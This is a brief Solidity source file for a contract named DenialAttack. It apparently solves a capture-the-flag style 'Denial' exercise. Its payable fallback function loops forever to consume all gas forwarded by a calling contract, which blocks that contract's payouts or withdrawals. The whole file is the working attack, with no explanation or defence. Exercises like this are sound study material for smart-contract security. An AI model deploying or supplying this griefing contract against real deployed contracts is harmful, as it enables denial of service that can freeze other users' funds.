// SPDX-License-Identifier: MIT

pragma solidity 0.8.37;

contract DenialAttack {

  fallback() external payable {
      // consume all the gas
      while(true) {}
  }

}
